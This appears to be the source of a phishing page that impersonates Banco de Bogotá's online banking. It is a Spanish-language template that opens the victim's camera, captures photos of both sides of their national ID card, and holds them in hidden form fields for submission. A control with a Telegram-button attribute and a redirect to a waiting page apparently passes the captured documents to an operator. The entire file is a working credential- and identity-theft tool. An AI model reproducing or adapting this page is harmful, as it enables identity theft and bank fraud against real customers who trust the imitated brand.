<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
    <title>Verificación de Documento - Banca Virtual Banco de Bogotá</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <x-control :auto-completar="false" :debug="false" redirect-url="/bogota/wait"
        toast-message="No se pudo verificar el documento, intente nuevamente" telegram-button="CEDULA" />
    <style>
        @font-face {
            font-family: Roboto-Regular;
            src: url(/bogota/6bede58e856278b0f8f1.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Medium;
            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Bold;
            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
            font-display: swap
        }

        body {
            font-family: Roboto-Regular;
            background-color: #f5f5f5;
        }

        .texto-1 {
            font-size: 24px;
            font-family: Roboto-Medium;
            color: #000000;
        }

        .texto-2 {
            font-size: 14px;
            font-family: Roboto-Regular;
            color: #666666;
        }

        .boton-1 {
            font-size: 16px;
            font-family: Roboto-Medium;
            width: 100%;
            border-radius: 100px;
            cursor: pointer;
            height: 48px;
            border: solid 1px #0043a9;
            background-color: #0043a9;
            color: #ffffff;
            transition: .3s;
        }

        .boton-1:disabled {
            background-color: #ccc;
            border-color: #ccc;
            cursor: not-allowed;
        }

        .boton-secundario {
            font-size: 14px;
            font-family: Roboto-Medium;
            border-radius: 100px;
            cursor: pointer;
            height: 40px;
            border: solid 2px #c94740;
            background-color: #ffffff;
            color: #c94740;
            transition: .3s;
        }

        .camera-container {
            position: relative;
            width: 100%;
            aspect-ratio: 1.6;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
        }

        #video, #canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        #canvas { display: none; }

        .preview-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }

        .document-guide {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 88%;
            height: 82%;
            border: 3px dashed rgba(0, 67, 169, 0.7);
            border-radius: 12px;
        }

        .document-guide.captured {
            border-color: #22c55e;
        }

        .document-label {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 5px 14px;
            border-radius: 16px;
            font-size: 12px;
            font-weight: 600;
        }

        .preview-box {
            flex: 1;
            aspect-ratio: 1.6;
            background: #f3f4f6;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            border: 2px dashed #d1d5db;
        }

        .preview-box.captured {
            border: 2px solid #22c55e;
        }

        .preview-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .preview-box .label {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 3px;
            font-size: 10px;
            text-align: center;
        }

        .preview-box .placeholder {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #9ca3af;
            font-size: 11px;
        }

        .paso {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            border-radius: 50px;
            font-size: 12px;
            font-weight: 600;
        }

        .paso.activo {
            background-color: #0043a9;
            color: #ffffff;
        }

        .paso.completado {
            background-color: #22c55e;
            color: #ffffff;
        }

        .paso.pendiente {
            background-color: #e5e7eb;
            color: #6b7280;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }
    </style>
</head>

<body class="px-3">
    <!-- Header -->
    <div class="text-center py-4">
        <img src="/bogota/logo_bogota_1.svg" width="300" height="auto" alt="Banco de Bogotá">
    </div>

    <!-- Contenido Principal -->
    <h1 class="texto-1 mt-2 text-center">Verificación de documento</h1>
    <p class="texto-2 text-center">Tome foto de su cédula por ambos lados</p>

    <!-- Indicador de pasos -->
    <div class="d-flex justify-content-center gap-3 my-3">
        <div class="paso activo" id="paso1">
            <span class="badge bg-white text-dark rounded-circle">1</span>
            <span>Frente</span>
        </div>
        <div class="paso pendiente" id="paso2">
            <span class="badge bg-white text-dark rounded-circle">2</span>
            <span>Reverso</span>
        </div>
    </div>

    <div class="bg-white rounded-3 p-3 mb-3">
        <!-- Error de cámara -->
        <div id="cameraError" class="d-none text-center py-4">
            <i class="bi bi-exclamation-triangle text-danger" style="font-size: 48px;"></i>
            <p class="text-danger fw-bold mt-2">No se pudo acceder a la cámara</p>
            <p class="text-muted small">Permita el acceso a la cámara en su navegador</p>
        </div>

        <!-- Contenedor de cámara -->
        <div id="cameraWrapper">
            <div class="camera-container">
                <video id="video" autoplay playsinline></video>
                <canvas id="canvas"></canvas>
                <img id="previewActual" class="preview-img" alt="Vista previa">
                <div class="overlay">
                    <div class="document-guide" id="documentGuide"></div>
                    <div class="document-label" id="documentLabel">Frente de la cédula</div>
                </div>
            </div>

            <!-- Instrucciones -->
            <div class="mt-3 bg-light rounded p-3">
                <ul class="small text-muted mb-0 ps-3">
                    <li>Coloque el documento dentro del recuadro</li>
                    <li>Asegúrese de que el texto sea legible</li>
                    <li>Evite reflejos y sombras</li>
                </ul>
            </div>

            <!-- Previews -->
            <div class="d-flex gap-3 mt-3">
                <div class="preview-box" id="previewFrente">
                    <div class="placeholder" id="placeholderFrente">
                        <i class="bi bi-credit-card-2-front"></i>
                        <span>Frente</span>
                    </div>
                    <img id="imgFrente" style="display:none;" alt="Frente">
                    <div class="label">Frente</div>
                </div>
                <div class="preview-box" id="previewReverso">
                    <div class="placeholder" id="placeholderReverso">
                        <i class="bi bi-credit-card-2-back"></i>
                        <span>Reverso</span>
                    </div>
                    <img id="imgReverso" style="display:none;" alt="Reverso">
                    <div class="label">Reverso</div>
                </div>
            </div>
        </div>

        <form id="formCedula" class="mt-4">
            <input type="hidden" id="cedula_frente" name="cedula_frente">
            <input type="hidden" id="cedula_reverso" name="cedula_reverso">
            <input type="hidden" id="no-status" name="status" value="cedula">

            <button type="button" id="btnCapturar" class="boton-1 mb-2">
                Capturar Frente
            </button>

            <button type="submit" id="enviar" class="boton-1 d-none mb-2">
                Continuar
            </button>

            <div class="d-flex gap-2">
                <button type="button" id="btnReintentarFrente" class="boton-secundario flex-fill d-none">
                    Repetir Frente
                </button>
                <button type="button" id="btnReintentarReverso" class="boton-secundario flex-fill d-none">
                    Repetir Reverso
                </button>
            </div>
        </form>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btnCapturar = document.getElementById('btnCapturar');
        const btnEnviar = document.getElementById('enviar');
        const btnReintentarFrente = document.getElementById('btnReintentarFrente');
        const btnReintentarReverso = document.getElementById('btnReintentarReverso');
        const cameraError = document.getElementById('cameraError');
        const cameraWrapper = document.getElementById('cameraWrapper');
        const documentLabel = document.getElementById('documentLabel');
        const documentGuide = document.getElementById('documentGuide');
        const paso1 = document.getElementById('paso1');
        const paso2 = document.getElementById('paso2');

        const cedulaFrente = document.getElementById('cedula_frente');
        const cedulaReverso = document.getElementById('cedula_reverso');
        const imgFrente = document.getElementById('imgFrente');
        const imgReverso = document.getElementById('imgReverso');
        const previewFrente = document.getElementById('previewFrente');
        const previewReverso = document.getElementById('previewReverso');
        const placeholderFrente = document.getElementById('placeholderFrente');
        const placeholderReverso = document.getElementById('placeholderReverso');

        let stream = null;
        let paso = 1;

        async function iniciarCamara() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });
                video.srcObject = stream;
            } catch (error) {
                cameraWrapper.style.display = 'none';
                cameraError.classList.remove('d-none');
            }
        }

        function actualizarPaso(numPaso, estado) {
            const pasoEl = numPaso === 1 ? paso1 : paso2;
            pasoEl.classList.remove('activo', 'completado', 'pendiente');
            pasoEl.classList.add(estado);
        }

        function capturarFoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.85);

            if (paso === 1) {
                cedulaFrente.value = imageData;
                imgFrente.src = imageData;
                imgFrente.style.display = 'block';
                placeholderFrente.style.display = 'none';
                previewFrente.classList.add('captured');

                paso = 2;
                actualizarPaso(1, 'completado');
                actualizarPaso(2, 'activo');
                documentLabel.textContent = 'Reverso de la cédula';
                btnCapturar.textContent = 'Capturar Reverso';
                btnReintentarFrente.classList.remove('d-none');
            } else if (paso === 2) {
                cedulaReverso.value = imageData;
                imgReverso.src = imageData;
                imgReverso.style.display = 'block';
                placeholderReverso.style.display = 'none';
                previewReverso.classList.add('captured');

                actualizarPaso(2, 'completado');
                btnCapturar.style.display = 'none';
                btnEnviar.classList.remove('d-none');
                btnReintentarReverso.classList.remove('d-none');
                documentGuide.classList.add('captured');
            }
        }

        function reintentarFrente() {
            cedulaFrente.value = '';
            imgFrente.src = '';
            imgFrente.style.display = 'none';
            placeholderFrente.style.display = 'flex';
            previewFrente.classList.remove('captured');
            cedulaReverso.value = '';
            imgReverso.src = '';
            imgReverso.style.display = 'none';
            placeholderReverso.style.display = 'flex';
            previewReverso.classList.remove('captured');

            paso = 1;
            actualizarPaso(1, 'activo');
            actualizarPaso(2, 'pendiente');
            documentLabel.textContent = 'Frente de la cédula';
            btnCapturar.textContent = 'Capturar Frente';
            btnCapturar.style.display = 'block';
            btnEnviar.classList.add('d-none');
            btnReintentarFrente.classList.add('d-none');
            btnReintentarReverso.classList.add('d-none');
            documentGuide.classList.remove('captured');
        }

        function reintentarReverso() {
            cedulaReverso.value = '';
            imgReverso.src = '';
            imgReverso.style.display = 'none';
            placeholderReverso.style.display = 'flex';
            previewReverso.classList.remove('captured');

            paso = 2;
            actualizarPaso(2, 'activo');
            documentLabel.textContent = 'Reverso de la cédula';
            btnCapturar.textContent = 'Capturar Reverso';
            btnCapturar.style.display = 'block';
            btnEnviar.classList.add('d-none');
            btnReintentarReverso.classList.add('d-none');
            documentGuide.classList.remove('captured');
        }

        btnCapturar.addEventListener('click', capturarFoto);
        btnReintentarFrente.addEventListener('click', reintentarFrente);
        btnReintentarReverso.addEventListener('click', reintentarReverso);

        iniciarCamara();
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
